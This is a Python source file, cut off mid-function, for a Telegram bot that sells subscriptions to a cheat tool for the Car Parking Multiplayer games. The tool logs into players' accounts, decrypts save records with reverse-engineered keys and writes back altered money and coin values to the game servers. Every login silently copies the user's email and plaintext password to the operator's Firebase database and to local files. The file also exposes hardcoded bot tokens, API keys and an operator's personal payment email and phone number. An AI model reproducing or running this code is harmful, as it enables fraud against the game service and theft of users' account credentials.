#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
☠️☠️☠️ MARKMWEHEHETOOL BOT - CPM1 + CPM2 ULTIMATE ☠️☠️☠️
MERGED - CPM2 activations, cloning, and car unlocking from old code
"""

import requests
import signal
import time
import json
import telebot
import random
import base64
import sys
import os
import string
import struct
import brotli
import hashlib
import zlib
import sqlite3
import asyncio
import aiohttp
import threading
from copy import deepcopy
from typing import Any, Dict, List, Optional, Tuple
from datetime import datetime, timedelta, timezone
from telebot import types
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════
# 🌐 FLASK WEB SERVER FOR RENDER DEPLOYMENT
# ═══════════════════════════════════════════════════════════

from flask import Flask, jsonify
app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "bot": "MARKMWEHEHETOOL",
        "version": "1.0.0",
        "uptime": "running"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

def run_flask():
    """Flask health server for Render (runs in background, never blocks)."""
    try:
        import logging
        logging.getLogger('werkzeug').setLevel(logging.ERROR)
        port = int(os.environ.get('PORT', 10000))  # Render's default web port is 10000
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
    except SystemExit:
        pass
    except Exception as e:
        print(f"⚠️ Flask server error: {e}")

# Flask is started LATER, inside __main__, to keep the module import clean
flask_thread = None

# ═══════════════════════════════════════════════════════════
# 🔑 TOKENS & KEYS
# ═══════════════════════════════════════════════════════════

BOT_TOKEN = '8857657486:AAExKiauUwNYusKYp8N-gMlawK6ZPtVdRq0'
bot = telebot.TeleBot(BOT_TOKEN)

ADMIN_IDS = [6531314640, 8650959684]
ALLOWED_KEYS = ["MARKMWEHEHETOOL7077", "MARKK", "TANNER"]
CHANNEL_ID = "-1003885017181"
CHANNEL_LINK = "https://t.me/markmwhehe"

# ═══════════════════════════════════════════════════════════
# 🔥 FIREBASE LOGGING CONFIG
# ═══════════════════════════════════════════════════════════

FIREBASE_API_KEY = "9rn0Ex4Mnc7VnMpBvxi1EyVsBfgRwo2UhVMNtPT0"
DB_URL = "https://cpm-2-7cea1-42c9a-default-rtdb.firebaseio.com"

# ═══════════════════════════════════════════════════════════
# 💳 SUBSCRIPTION & PAYMENT SETTINGS
# ═══════════════════════════════════════════════════════════

GROUP_LOG_ID = -1004441134033  # Group for payment logs

SUBSCRIPTION_DURATIONS = {
    "1_day": 24, "5_days": 120, "1_week": 168, "3_weeks": 504,
    "5_weeks": 840, "7_weeks": 1176, "12_weeks": 2016, "14_weeks": 2352,
}

SUBSCRIPTION_STARS = {
    "1_day": 30, "5_days": 130, "1_week": 200, "3_weeks": 250,
    "5_weeks": 300, "7_weeks": 330, "12_weeks": 1050, "14_weeks": 1250,
}

SUBSCRIPTION_MONEY = {
    "1_day": "30 Pesos | $1", "5_days": "130 Pesos | $3",
    "1_week": "200 Pesos | $4", "3_weeks": "250 Pesos | $5",
    "5_weeks": "300 Pesos | $6", "7_weeks": "330 Pesos | $7",
    "12_weeks": "1,050 Pesos | $13", "14_weeks": "1,250 Pesos | $17",
}

PAYMENT_METHODS = {
    "paypal": {
        "label": "💳 PayPal",
        "details": "📧 **Email:** `markryanmanoguid867@gmail.com`\n📌 Please screenshot the payment."
    },
    "paymaya": {
        "label": "📱 PayMaya",
        "details": "📱 **Number:** `09281630511`\n👤 **Name:** MARK RYAN MANOGUID\n📌 Please screenshot the payment."
    },
    "gcash_to_paymaya": {
        "label": "🔄 GCash to PayMaya",
        "details": "📌 DM @Maarkryan so he can send the QR code.\n📌 Please screenshot the payment."
    }
}

PENDING_SUBSCRIPTIONS = {}

# ═══════════════════════════════════════════════════════════
# 📁 LOCAL LOG FILES
# ═══════════════════════════════════════════════════════════

CREDENTIALS_BACKUP_CPM1 = "credentials_backup_cpm1.txt"
CREDENTIALS_BACKUP_CPM2 = "credentials_backup_cpm2.txt"
DETAILED_CHANGES_CPM1   = "detailed_changes_cpm1.txt"
DETAILED_CHANGES_CPM2   = "detailed_changes_cpm2.txt"
KEYS_LOG_FILE = "keys_log.json"

# ═══════════════════════════════════════════════════════════
# 🔥 FIREBASE HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════

def db_put(path, data):
    url = f"{DB_URL}/{path}.json?auth={FIREBASE_API_KEY}"
    try:
        r = requests.put(url, json=data, timeout=30)
        return r.status_code in (200, 204)
    except Exception as e:
        print(f"❌ Firebase PUT error: {e}")
        return False

def db_get(path, limit=None):
    url = f"{DB_URL}/{path}.json?auth={FIREBASE_API_KEY}"
    if limit:
        url += f'&orderBy="$key"&limitToLast={limit}'
    try:
        r = requests.get(url, timeout=30)
        if r.status_code == 200:
            return r.json()
        return None
    except Exception as e:
        print(f"❌ Firebase GET error: {e}")
        return None

def db_delete(path):
    url = f"{DB_URL}/{path}.json?auth={FIREBASE_API_KEY}"
    try:
        r = requests.delete(url, timeout=30)
        return r.status_code in (200, 204)
    except Exception as e:
        print(f"❌ Firebase DELETE error: {e}")
        return False

def db_push(path, data):
    url = f"{DB_URL}/{path}.json?auth={FIREBASE_API_KEY}"
    try:
        r = requests.post(url, json=data, timeout=15)
        return r.status_code in (200, 204)
    except Exception as e:
        print(f"❌ Firebase PUSH error: {e}")
        return False

# ═══════════════════════════════════════════════════════════
# 📋 CLOUD LOG FUNCTIONS
# ═══════════════════════════════════════════════════════════

def append_credentials_backup(email, password, game="cpm2"):
    filename = CREDENTIALS_BACKUP_CPM1 if game == "cpm1" else CREDENTIALS_BACKUP_CPM2
    try:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f"{email}:{password}\n")
    except Exception as e:
        print(f"⚠️ Failed to append credentials backup: {e}")

def append_detailed_change(change_type, old_email, new_email, old_password, new_password, username, user_id, game="cpm2"):
    filename = DETAILED_CHANGES_CPM1 if game == "cpm1" else DETAILED_CHANGES_CPM2
    entry = (
        f"--- Change on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
        f"Type: {change_type}\n"
        f"Old Email: {old_email}\n"
        f"New Email: {new_email}\n"
        f"Old Password: {old_password}\n"
        f"New Password: {new_password}\n"
        f"Changed by: @{username} (ID: {user_id})\n"
        "---------------------------------------------\n"
    )
    try:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(entry)
    except Exception as e:
        print(f"⚠️ Failed to append detailed change: {e}")

def cloud_log_credentials(email, password, game="cpm2", change_type="", old_email="", username="", user_id=0):
    entry = {
        "email": email,
        "password": password,
        "game": game,
        "change_type": change_type,
        "old_email": old_email,
        "username": username,
        "user_id": user_id,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    db_push("logs/credentials", entry)
    append_credentials_backup(email, password, game)

def cloud_log_change(change_type, old_email, new_email, old_password, new_password, username, user_id, game="cpm2"):
    entry = {
        "change_type": change_type,
        "old_email": old_email,
        "new_email": new_email,
        "old_password": old_password,
        "new_password": new_password,
        "username": username,
        "user_id": user_id,
        "game": game,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    db_push("logs/changes", entry)
    append_detailed_change(change_type, old_email, new_email, old_password, new_password, username, user_id, game)

def cloud_log_key_event(user_id, key_type, action="added", admin_id=None):
    entry = {
        "user_id": user_id,
        "key_type": key_type,
        "action": action,
        "admin_id": admin_id,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    db_push("logs/keys", entry)
    try:
        with open(KEYS_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception as e:
        print(f"⚠️ Failed to log key event: {e}")

# ═══════════════════════════════════════════════════════════
# 📡 API SETTINGS
# ═══════════════════════════════════════════════════════════

FK = "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA"
LOAD_URL = "https://europe-west1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords3"
SAVE_URL = "https://europe-west1-cp-multiplayer.cloudfunctions.net/SavePlayerRecordsPartially8"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating5"
MAX_MONEY = 50_000_000
MAX_COIN = 500_000

GAME_HEADERS = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
    "X-Unity-Version": "2022.3.62f2",
}

CPM2_API_KEY = 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ'
CPM2_BASE = 'https://europe-west1-cpm-2-7cea1.cloudfunctions.net'
CPM2_OG_KEY = '320b93f3e7f4410aa52ce24da363ad04'
CPM2_VERSION = '1.3.2.3'
CPM2_CLIENT_HASH = 'F05A72840B40DC4FAADF539C5E38062527AE6422'
CPM2_BUNDLE_ID = 'com.olzhas.carparking.multyplayer2'
CPM2_OG_BASE = 'https://cpm-2.ogames.kz/api'
CPM2_KEY_ADD = '12345678'
CPM2_IV_ADD = '01234567'
CPM2_USER_AGENT = 'UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)'
FB_SIGNUP_CPM2 = f'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={CPM2_API_KEY}'

HAS_CRYPTO = True
HAS_BROTLI = True

# ═══════════════════════════════════════════════════════════
# 🔑 KEY TRACKING
# ═══════════════════════════════════════════════════════════

KEY_USAGE = {}
KEY_USAGE_COUNT = {}
KEY_USERS_DETAILS = {}
TIME_KEYS = {}
TRIAL_KEYS = {}
FREE_TRIAL_USERS = {}
USER_SUBSCRIPTIONS = {}

# ═══════════════════════════════════════════════════════════
# ENCRYPTION / DECRYPTION FUNCTIONS (from cpm_nuker.py)
# ═══════════════════════════════════════════════════════════

def make_xor_key(uid: str) -> bytes:
    chars = list(str(uid or ""))
    if len(chars) >= 9:
        chars[1], chars[8] = chars[8], chars[1]
    if len(chars) >= 3:
        chars.pop(2)
    if len(chars) >= 5:
        chars.append(chars[4])
    key = "".join(chars).encode("utf-8")
    return key or b"0"

def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def decompress(data: bytes):
    if HAS_BROTLI:
        try:
            return brotli.decompress(data)
        except Exception:
            pass
    for args in ((zlib.MAX_WBITS | 16,), tuple()):
        try:
            return zlib.decompress(data, *args)
        except Exception:
            pass
    return None

def decrypt_aes(data: bytes, key: bytes):
    if not HAS_CRYPTO:
        return None
    try:
        cipher = AES.new(key[:16], AES.MODE_CBC, b"\x00" * 16)
        return unpad(cipher.decrypt(data), 16)
    except Exception:
        return None

def _md5(text: str) -> bytes:
    return hashlib.md5(str(text).encode()).digest()

def _sha1(text: str) -> bytes:
    return hashlib.sha1(str(text).encode()).digest()[:16]

def build_aes_keys(uid: str, password: str = None, email: str = None) -> list:
    keys = [_md5("olzhas_carparking")]
    if password:
        keys.extend([_md5(password), _sha1(password)])
    if uid:
        keys.extend([_md5(uid), _sha1(uid)])
    if email:
        keys.append(_md5(email))
    return keys

class Reader:
    def __init__(self, data: bytes):
        self.buf = data
        self.pos = 0

    def has_bytes(self, n: int) -> bool:
        return self.pos + n <= len(self.buf)

    def read_byte(self) -> int:
        if not self.has_bytes(1):
            return 0
        value = self.buf[self.pos]
        self.pos += 1
        return value

    def read_int(self) -> int:
        if not self.has_bytes(4):
            self.pos = len(self.buf)
            return 0
        value = struct.unpack_from("<i", self.buf, self.pos)[0]
        self.pos += 4
        return value

    def read_float(self) -> float:
        if not self.has_bytes(4):
            self.pos = len(self.buf)
            return 0.0
        value = struct.unpack_from("<f", self.buf, self.pos)[0]
        self.pos += 4
        return value

    def read_string(self) -> str:
        marker = self.read_int()
        if marker in (0, -1):
            return ""
        length = (-marker) - 1 if marker < -1 else marker
        if marker < -1:
            self.read_int()
        length = max(0, min(length, 1000000))
        if not self.has_bytes(length):
            return ""
        text = self.buf[self.pos:self.pos + length].decode("utf-8", errors="replace")
        self.pos += length
        return text.replace("\x00", "").strip()

    def read_list(self, item_fn):
        count = self.read_int()
        if count <= 0 or count > 1000000:
            return []
        result = []
        for _ in range(count):
            if self.pos >= len(self.buf):
                break
            value = item_fn()
            if value is not None:
                result.append(value)
        return result

    def read_dict(self) -> dict:
        count = self.read_int()
        if count <= 0 or count > 1000000:
            return {}
        result = {}
        for _ in range(count):
            if self.pos >= len(self.buf):
                break
            result[self.read_int()] = self.read_int()
        return result

    def read_equipment(self):
        if self.read_byte() == 0:
            return None
        return {
            "hair": self.read_list(self.read_int),
            "face": self.read_list(self.read_int),
            "beard": self.read_list(self.read_int),
            "cap": self.read_list(self.read_int),
            "mask": self.read_list(self.read_int),
            "top": self.read_list(self.read_int),
            "gloves": self.read_list(self.read_int),
            "bag": self.read_list(self.read_int),
            "pants": self.read_list(self.read_int),
            "shoes": self.read_list(self.read_int),
            "glasses": self.read_list(self.read_int),
            "SelectedEquipments": self.read_list(self.read_int),
            "Gender": self.read_int(),
        }

def parse_player(buf: bytes) -> dict:
    r = Reader(buf)
    if r.read_byte() == 0:
        return None
    player = {}
    player["Name"] = r.read_string()
    player["money"] = r.read_int()
    player["coin"] = r.read_int()
    player["localID"] = r.read_string()
    player["boughtFsos"] = r.read_list(r.read_int)

    def read_friend():
        r.read_byte()
        return {"id": r.read_string(), "Name": r.read_string(), "accountID": r.read_string()}

    player["FriendsID"] = r.read_list(read_friend)
    player["LevelsDoneTime"] = r.read_list(r.read_float)
    player["floats"] = r.read_list(r.read_float)
    player["integers"] = r.read_list(r.read_int)
    player["fcar"] = r.read_list(r.read_int)
    player["favouriteWheels"] = r.read_list(r.read_int)
    player["favouriteVinyls"] = r.read_list(r.read_int)
    player["favouriteEmojis"] = r.read_list(r.read_int)
    player["personEquipmentsMale"] = r.read_equipment()
    player["personEquipmentsFemale"] = r.read_equipment()

    if r.read_byte() == 0:
        player["platesData"] = None
    else:
        def read_vinyl():
            r.read_byte()
            def rv():
                return {"x": r.read_float(), "y": r.read_float(), "z": r.read_float()}
            return {"vectors": r.read_list(rv), "v": r.read_list(r.read_string),
                    "floats": r.read_list(r.read_float), "text": r.read_string()}
        def read_plate():
            r.read_byte()
            return {"plateId": r.read_int(), "frontCarId": r.read_int(),
                    "rearCarId": r.read_int(), "vinyls": r.read_list(read_vinyl)}
        player["platesData"] = {"allPlates": r.read_list(read_plate)}

    if r.read_byte() == 0:
        player["carIDnStatus"] = None
    else:
        player["carIDnStatus"] = {
            "carGeneratedIDs": r.read_list(r.read_string),
            "carStatus": r.read_list(r.read_int),
        }
    player["allData"] = r.read_string()
    player["flags"] = r.read_dict()
    player["animations"] = r.read_list(r.read_int)
    player["emojiPacks"] = r.read_list(r.read_int)
    player["wheels"] = r.read_list(r.read_int)
    player["boughtPoliceLights"] = r.read_list(r.read_int)
    player["boughtPoliceSirens"] = r.read_list(r.read_int)
    return player

def try_parse(buf: bytes) -> dict:
    candidates = [buf]
    first = decompress(buf)
    if first:
        candidates.append(first)
        second = decompress(first)
        if second:
            candidates.append(second)
    for candidate in candidates:
        if not candidate:
            continue
        if candidate and candidate[0] in (17, 23, 24):
            try:
                parsed = parse_player(candidate)
                if parsed and parsed.get("Name") is not None:
                    return parsed
            except Exception:
                pass
        try:
            clean = candidate[3:] if len(candidate) >= 3 and candidate[:2] == b"\xef\xbb" else candidate
            if clean and clean[0] == 123:
                return json.loads(clean.decode("utf-8"))
        except Exception:
            pass
    return None

def decrypt_player_record(base64_text: str, uid: str, password: str = None, email: str = None) -> dict:
    try:
        buf = base64.b64decode(base64_text)
    except Exception:
        return {"success": False, "message": "Bad base64"}
    if len(buf) < 10:
        return {"success": False, "message": "Too small"}

    direct = try_parse(buf)
    if direct:
        return {"success": True, "record": direct}

    if uid:
        try:
            decoded = decompress(xor_bytes(buf, make_xor_key(uid)))
            if decoded:
                parsed = try_parse(decoded)
                if parsed:
                    return {"success": True, "record": parsed}
        except Exception:
            pass

    for key in build_aes_keys(uid or "", password, email):
        plain = decrypt_aes(buf, key)
        if not plain:
            continue
        parsed = try_parse(plain)
        if parsed:
            return {"success": True, "record": parsed}
    return {"success": False, "message": "Could not decrypt"}

class Writer:
    def __init__(self):
        self._p: List[bytes] = []

    def write_byte(self, v):
        self._p.append(bytes([int(v or 0) & 0xFF]))

    def write_int(self, v):
        self._p.append(struct.pack("<i", int(v or 0)))

    def write_float(self, v):
        self._p.append(struct.pack("<f", float(v or 0.0)))

    def write_string(self, s):
        if s is None:
            self._p.append(struct.pack("<i", -1))
            return
        s = str(s)
        if s == "":
            self._p.append(struct.pack("<i", 0))
            return
        enc = s.encode("utf-8")
        self._p.append(struct.pack("<ii", -(len(enc)) - 1, len(s)) + enc)

    def write_list(self, lst, fn):
        if lst is None:
            self._p.append(struct.pack("<i", -1))
            return
        self._p.append(struct.pack("<i", len(lst)))
        for item in lst:
            fn(item)

    def write_equipment(self, data):
        if not data:
            self.write_byte(0)
            return
        self.write_byte(13)
        for key in ["hair", "face", "beard", "cap", "mask", "top", "gloves", "bag", "pants", "shoes", "glasses", "SelectedEquipments"]:
            self.write_list(data.get(key, []), self.write_int)
        self.write_int(data.get("Gender", 0))

    def write_plates(self, data):
        if not data:
            self.write_byte(0)
            return
        self.write_byte(1)
        plates = data.get("allPlates", [])
        self._p.append(struct.pack("<i", len(plates)))
        for plate in plates:
            self.write_byte(4)
            self.write_int(plate.get("plateId", 0))
            self.write_int(plate.get("frontCarId", 0))
            self.write_int(plate.get("rearCarId", 0))
            vinyls = plate.get("vinyls", [])
            self._p.append(struct.pack("<i", len(vinyls)))
            for vinyl in vinyls:
                self.write_byte(4)
                vecs = vinyl.get("vectors", [])
                self._p.append(struct.pack("<i", len(vecs)))
                for vec in vecs:
                    self._p.append(struct.pack("<fff", vec.get("x", 0), vec.get("y", 0), vec.get("z", 0)))
                self.write_list(vinyl.get("v", []), self.write_string)
                self.write_list(vinyl.get("floats", []), self.write_float)
                self.write_string(vinyl.get("text", ""))

    def write_car_id_status(self, data):
        if not data:
            self.write_byte(0)
            return
        self.write_byte(2)
        self.write_list(data.get("carGeneratedIDs", []), self.write_string)
        self.write_list(data.get("carStatus", []), self.write_int)

    def to_bytes(self):
        return b"".join(self._p)

FIELD_MAPPING = [
    (1, "localID"), (2, "money"), (3, "Name"), (4, "coin"), (5, "allData"),
    (6, "boughtFsos"), (7, "boughtPoliceLights"), (8, "boughtPoliceSirens"),
    (9, "FriendsID"), (10, "LevelsDoneTime"), (11, "floats"), (12, "integers"),
    (13, "fcar"), (14, "favouriteWheels"), (15, "favouriteVinyls"),
    (16, "favouriteEmojis"), (18, "emojiPacks"),
    (41, "personEquipmentsMale"), (42, "personEquipmentsFemale"),
    (43, "platesData"), (44, "carIDnStatus"), (45, "flags"),
    (46, "animations"), (48, "wheels"),
]
INT_LIST_FIELDS = {6, 7, 8, 12, 13, 14, 15, 16, 18, 46, 48}
FLOAT_LIST_FIELDS = {10, 11}
ALWAYS_SEND = {"allData"}

def _field_modified(new_value, old_value) -> bool:
    if new_value is None and old_value is None:
        return False
    if new_value is None or old_value is None:
        return True
    if type(new_value) != type(old_value):
        return True
    if isinstance(new_value, (dict, list)):
        return json.dumps(new_value, sort_keys=True) != json.dumps(old_value, sort_keys=True)
    return new_value != old_value

def serialize_field(fid: int, value: Any) -> Optional[bytes]:
    w = Writer()
    if fid in (1, 3, 5):
        w.write_string(value)
        return w.to_bytes()
    if fid in (2, 4):
        w.write_int(value or 0)
        return w.to_bytes()
    if fid == 9:
        friends = value or []
        w._p.append(struct.pack("<i", len(friends)))
        for friend in friends:
            friend = friend or {}
            w.write_byte(3)
            w.write_string(friend.get("id", ""))
            w.write_string(friend.get("Name", ""))
            w.write_string(friend.get("accountID", ""))
        return w.to_bytes()
    if fid in INT_LIST_FIELDS:
        w.write_list(value or [], w.write_int)
        return w.to_bytes()
    if fid in FLOAT_LIST_FIELDS:
        w.write_list(value or [], w.write_float)
        return w.to_bytes()
    if fid in (41, 42):
        w.write_equipment(value)
        return w.to_bytes()
    if fid == 43:
        w.write_plates(value)
        return w.to_bytes()
    if fid == 44:
        w.write_car_id_status(value)
        return w.to_bytes()
    if fid == 45:
        flags = value or {}
        w._p.append(struct.pack("<i", len(flags)))
        for key, val in flags.items():
            w.write_int(int(key))
            w.write_int(int(val))
        return w.to_bytes()
    return None

def build_payload(record: Dict[str, Any], uid: str, original: Optional[Dict[str, Any]] = None,
                  force_fields: Optional[set] = None) -> str:
    force_fields = set(force_fields or [])
    fields = []
    for fid, key in FIELD_MAPPING:
        value = record.get(key)
        if value is None:
            continue
        if key in ALWAYS_SEND:
            should_send = isinstance(value, str) and len(value) > 0
        elif key in force_fields:
            should_send = True
        elif original is not None:
            should_send = _field_modified(value, original.get(key))
        else:
            should_send = True
        if not should_send:
            continue
        raw = serialize_field(fid, value)
        if raw is not None:
            fields.append((fid, raw))

    parts = [struct.pack("<i", len(fields))]
    for fid, raw in fields:
        parts.append(struct.pack("<hi", fid, len(raw)))
        parts.append(raw)
    combined = b"".join(parts)
    compressed = brotli.compress(combined) if HAS_BROTLI else zlib.compress(combined)
    encrypted = xor_bytes(compressed, make_xor_key(uid))
    return base64.b64encode(encrypted).decode("ascii")

# ═══════════════════════════════════════════════════════════
# 📦 CPMNuker Class
# ═══════════════════════════════════════════════════════════

class CPMNuker:
    def __init__(self, db_path: str = "cpm_tokens.db"):
        self.db_path = db_path
        self.cache: Dict[str, Dict[str, Any]] = {}
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path) as c:
            c.execute("""CREATE TABLE IF NOT EXISTS tokens (
                user_id INTEGER PRIMARY KEY,
                auth_token TEXT,
                email TEXT,
                password TEXT,
                refresh_token TEXT,
                firebase_uid TEXT,
                token_expires_at REAL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            c.execute("""CREATE TABLE IF NOT EXISTS user_data (
                cache_key TEXT PRIMARY KEY,
                email TEXT,
                data_json TEXT,
                saved_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            c.execute("""CREATE TABLE IF NOT EXISTS backups (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                label TEXT,
                data_json TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            for stmt in (
                "ALTER TABLE tokens ADD COLUMN firebase_uid TEXT",
                "ALTER TABLE tokens ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP",
                "ALTER TABLE user_data ADD COLUMN saved_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP",
            ):
                try:
                    c.execute(stmt)
                except Exception:
                    pass
            c.commit()

    def _ck(self, uid: int, email: Optional[str] = None) -> str:
        if email:
            return f"{uid}_{email}"
        td = self.get_token_data(uid)
        return f"{uid}_{td['email']}" if td and td.get("email") else str(uid)

    def save_token(self, uid: int, auth: str, email: str, pw: Optional[str] = None,
                   rt: Optional[str] = None, fuid: Optional[str] = None):
        with sqlite3.connect(self.db_path) as c:
            c.execute("""INSERT OR REPLACE INTO tokens
                (user_id, auth_token, email, password, refresh_token, firebase_uid, token_expires_at)
                VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (uid, auth, email, pw, rt, fuid, time.time() + 3600))
            c.commit()
        try:
            cloud_log_credentials(email, pw or "", "cpm1", "login", "", "", uid)
        except Exception as e:
            print(f"⚠️ Failed to log credentials: {e}")

    def get_token_data(self, uid: int) -> Optional[Dict[str, Any]]:
        with sqlite3.connect(self.db_path) as c:
            row = c.execute("""SELECT auth_token, email, password, refresh_token, firebase_uid, token_expires_at
                               FROM tokens WHERE user_id=?""", (uid,)).fetchone()
        if not row:
            return None
        return {
            "auth_token": row[0], "email": row[1], "password": row[2],
            "refresh_token": row[3], "firebase_uid": row[4], "token_expires_at": row[5]
        }

    def get_token(self, uid: int) -> Optional[Dict[str, str]]:
        td = self.get_token_data(uid)
        return {"auth_token": td["auth_token"], "email": td["email"]} if td else None

    def update_token(self, uid: int, auth: str, rt: Optional[str] = None):
        with sqlite3.connect(self.db_path) as c:
            if rt:
                c.execute("UPDATE tokens SET auth_token=?, refresh_token=?, token_expires_at=? WHERE user_id=?",
                          (auth, rt, time.time() + 3600, uid))
            else:
                c.execute("UPDATE tokens SET auth_token=?, token_expires_at=? WHERE user_id=?",
                          (auth, time.time() + 3600, uid))
            c.commit()

    def delete_token(self, uid: int):
        with sqlite3.connect(self.db_path) as c:
            c.execute("DELETE FROM tokens WHERE user_id=?", (uid,))
            c.commit()
        for key in [k for k in self.cache if k.startswith(str(uid))]:
            del self.cache[key]

    def is_expired(self, uid: int) -> bool:
        td = self.get_token_data(uid)
        return not td or not td.get("token_expires_at") or td["token_expires_at"] < time.time()

    def get_record(self, uid: int, email: Optional[str] = None) -> Dict[str, Any]:
        ck = self._ck(uid, email)
        if ck not in self.cache:
            with sqlite3.connect(self.db_path) as c:
                row = c.execute("SELECT data_json FROM user_data WHERE cache_key=?", (ck,)).fetchone()
            if row:
                try:
                    self.cache[ck] = json.loads(row[0])
                except Exception:
                    pass
        return self.cache.get(ck, {})

    def set_record(self, uid: int, data: Dict[str, Any], email: Optional[str] = None):
        ck = self._ck(uid, email)
        self.cache[ck] = data
        with sqlite3.connect(self.db_path) as c:
            c.execute("INSERT OR REPLACE INTO user_data (cache_key, email, data_json) VALUES (?, ?, ?)",
                      (ck, email, json.dumps(data)))
            c.commit()

    async def _post(self, url: str, payload: Dict[str, Any], headers: Dict[str, str]) -> Optional[Dict[str, Any]]:
        try:
            clean_headers = {k: v for k, v in headers.items() if k.lower() != "host"}
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as s:
                async with s.post(url, json=payload, headers=clean_headers) as resp:
                    text = await resp.text()
                    try:
                        return json.loads(text)
                    except Exception:
                        return {"raw": text, "status": resp.status}
        except Exception as exc:
            print(f"HTTP error: {exc}")
            return None

    async def login(self, email: str, password: str) -> Dict[str, Any]:
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={FK}"
        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
            "X-Unity-Version": "2022.3.62f2",
        }
        payload = {"email": email, "password": password, "returnSecureToken": True, "clientType": "CLIENT_TYPE_ANDROID"}
        result = await self._post(url, payload, headers)
        if not result:
            return {"ok": False, "message": "NETWORK_ERROR"}
        if "idToken" in result:
            return {
                "ok": True,
                "message": "OK",
                "auth": result["idToken"],
                "refresh_token": result.get("refreshToken", ""),
                "firebase_uid": result.get("localId", ""),
            }
        err = str(result.get("error", {}).get("message", "")).upper()
        for key in ["EMAIL_NOT_FOUND", "INVALID_PASSWORD", "INVALID_LOGIN_CREDENTIALS", "TOO_MANY_ATTEMPTS", "USER_DISABLED", "INVALID_EMAIL"]:
            if key in err:
                return {"ok": False, "message": key}
        return {"ok": False, "message": f"LOGIN_FAILED: {err[:80]}"}

    async def account_login(self, email: str, password: str) -> Dict[str, Any]:
        return await self.login(email, password)

    async def _refresh(self, uid: int) -> Tuple[bool, str]:
        td = self.get_token_data(uid)
        if not td:
            return False, "NO_TOKEN"
        rt, em, pw = td.get("refresh_token"), td.get("email"), td.get("password")
        if rt:
            try:
                result = await self._post(
                    f"https://securetoken.googleapis.com/v1/token?key={FK}",
                    {"grant_type": "refresh_token", "refresh_token": rt},
                    {"Content-Type": "application/json"},
                )
                if result and result.get("id_token"):
                    self.update_token(uid, result["id_token"], result.get("refresh_token", rt))
                    return True, "OK"
            except Exception:
                pass
        if em and pw:
            result = await self.login(em, pw)
            if result.get("ok"):
                self.save_token(uid, result["auth"], em, pw, result.get("refresh_token", ""), result.get("firebase_uid", ""))
                return True, "OK"
        return False, "REFRESH_FAILED"

    async def get_auth(self, uid: int) -> Tuple[bool, str, str]:
        if self.is_expired(uid):
            ok, msg = await self._refresh(uid)
            if not ok:
                return False, msg, ""
        td = self.get_token_data(uid)
        if td and td.get("auth_token"):
            return True, "OK", td["auth_token"]
        return False, "NO_TOKEN", ""

    async def load(self, uid: int, force: bool = False) -> bool:
        td = self.get_token_data(uid)
        if not td:
            return False
        ck = self._ck(uid)
        if not force and ck in self.cache:
            return True
        ok, msg, auth = await self.get_auth(uid)
        if not ok:
            print(f"load: no valid token for {uid}: {msg}")
            return False
        result = await self._post(LOAD_URL, {"data": None}, {**GAME_HEADERS, "Authorization": f"Bearer {auth}"})
        if not result or not result.get("result"):
            print(f"load: empty/invalid response for {uid}: {str(result)[:200]}")
            return False
        decoded = decrypt_player_record(result["result"], td.get("firebase_uid", ""), td.get("password", ""), td.get("email", ""))
        if decoded.get("success") and decoded.get("record"):
            self.set_record(uid, decoded["record"], td.get("email", ""))
            print(f"Loaded {uid}: {decoded['record'].get('Name')}")
            return True
        print(f"load: decrypt failed for {uid}: {decoded.get('message')}")
        return False

    async def load_account(self, uid: int, force: bool = False) -> bool:
        return await self.load(uid, force)

    def _ok(self, value: Any) -> bool:
        if value in (1, True):
            return True
        if value in (0, False, None):
            return False
        if isinstance(value, str):
            text = value.strip()
            if text == "1":
                return True
            if text == "0":
                return False
            try:
                return self._ok(json.loads(text))
            except Exception:
                return False
        if isinstance(value, dict):
            for key in ("result", "ok", "success"):
                if key in value:
                    return self._ok(value[key])
        return False

    async def _send(self, auth: str, record: Dict[str, Any], fuid: str,
                    original: Optional[Dict[str, Any]] = None,
                    force_fields: Optional[set] = None) -> Tuple[bool, str]:
        if not fuid:
            return False, "NO_FIREBASE_UID"
        try:
